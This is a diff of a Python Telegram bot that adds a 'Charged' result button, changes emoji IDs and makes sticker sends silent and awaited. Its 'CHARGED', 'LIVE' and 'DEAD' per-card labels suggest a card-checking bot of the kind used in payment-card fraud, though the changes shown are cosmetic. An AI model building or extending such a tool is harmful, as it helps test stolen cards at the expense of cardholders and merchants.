@@ -121,14 +121,15 @@ HIT_RESP_EMOJI_ID = "5839116473951328489"
 PROG_GATE_EMOJI_ID     = "5341715473882955310"
 PROG_PROGRESS_EMOJI_ID = "5258113901106580375"
 PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
-PROG_LIVE_EMOJI_ID     = "5427168083074628963"
+PROG_LIVE_EMOJI_ID     = "6267225207560214192"   # ← fixed (was same as CHARGED)
 PROG_DEAD_EMOJI_ID     = "4958526153955476488"
 PROG_ERRORS_EMOJI_ID   = "4956611513369494230"
 
 # Button emojis
-BTN_LIVE_EMOJI_ID = "5039793437776282663"
-BTN_ALL_EMOJI_ID  = "4956324463525233747"
-BTN_STOP_EMOJI_ID = "6179444193518162239"
+BTN_CHARGED_EMOJI_ID = "5465465194056525619"   # 💎 charged button
+BTN_LIVE_EMOJI_ID    = "5039793437776282663"   # ✅ live button
+BTN_ALL_EMOJI_ID     = "4956324463525233747"   # 📁 all button
+BTN_STOP_EMOJI_ID    = "6179444193518162239"   # ⛔ stop button
 
 # Pool of 18 premium animated emojis — used for CHARGED and LIVE hits (random per card)
 CHARGED_EMOJI_IDS = [
@@ -1697,13 +1698,16 @@ async def _get_sticker_fid(bot, emoji_id: str):
 
 async def _send_sticker(bot, chat_id, emoji_id: str):
     """Send a full-size animated sticker for the given custom emoji ID.
+    Uses disable_notification=True so it arrives silently (no ping sound).
     Silently skips if the sticker cannot be resolved."""
     fid = await _get_sticker_fid(bot, emoji_id)
     if fid:
         try:
-            await bot.send_sticker(chat_id=chat_id, sticker=fid)
+            await bot.send_sticker(chat_id=chat_id, sticker=fid,
+                                   disable_notification=True)
+            logging.info(f"[STICKER] ✓ sent eid={emoji_id[:12]}… to {chat_id}")
         except Exception as exc:
-            logging.debug(f"[STICKER] send to {chat_id}: {exc}")
+            logging.warning(f"[STICKER] send to {chat_id} failed: {exc}")
 
 
 def _plan_eid(plan: str) -> str:
@@ -2044,10 +2048,13 @@ def _msh_buttons(sid: str, running: bool) -> RawMarkup:
     sess   = MSH_SESSIONS.get(sid, {})
     live_n = sess.get("approved", 0)
     all_n  = sess.get("checked",  0)
+    charged_n = sess.get("charged", 0)
     rows = [[
-        _btn(f"Live ({live_n})", cb=f"{_CB_RESULT}:{sid}:live",
-             style="success", icon=BTN_LIVE_EMOJI_ID),
-        _btn(f"All ({all_n})",  cb=f"{_CB_RESULT}:{sid}:all",
+        _btn(f"Charged ({charged_n})", cb=f"{_CB_RESULT}:{sid}:charged",
+             style="danger",   icon=BTN_CHARGED_EMOJI_ID),
+        _btn(f"Live ({live_n})",       cb=f"{_CB_RESULT}:{sid}:live",
+             style="success",  icon=BTN_LIVE_EMOJI_ID),
+        _btn(f"All ({all_n})",         cb=f"{_CB_RESULT}:{sid}:all",
              style="primary",  icon=BTN_ALL_EMOJI_ID),
     ]]
     if running:
@@ -2567,7 +2574,8 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _cmd_eid = get_random_live_emoji()
     else:
         _cmd_eid = DECLINED_EMOJI_ID
-    asyncio.create_task(_send_sticker(context.bot, update.effective_chat.id, _cmd_eid))
+    # await (not create_task) — guarantees sticker lands BEFORE the result card edit
+    await _send_sticker(context.bot, update.effective_chat.id, _cmd_eid)
 
     # Two buttons on every result card: main channel + logs channel
     kb = RawMarkup([[
